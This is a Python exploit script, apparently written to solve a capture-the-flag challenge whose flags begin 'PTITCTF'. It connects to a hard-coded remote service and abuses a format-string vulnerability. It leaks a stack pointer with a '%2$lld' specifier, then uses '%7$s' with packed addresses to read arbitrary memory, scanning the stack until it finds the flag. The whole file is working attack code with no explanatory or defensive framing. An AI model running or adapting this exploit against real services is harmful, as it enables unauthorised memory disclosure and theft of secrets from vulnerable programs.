#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

# Scan stack region from buffer (arg2) both directions, robust
found=[]
for attempt in range(40):
    try:
        s=newconn()
        buf=leak_lld(s,2)
        if not buf: s.close(); continue
        for d in range(0,0x2000,0x4):
            X=buf-d
            r=readmem(s,X)
            if b'PTITCTF' in r or b'{' in r:
                print("MARK",hex(X),repr(r[:200])); found.append(X)
            if r==b'<T':
                break
        s.close()
    except Exception as e:
        pass
    if found: break
print("found", [hex(x) for x in found])
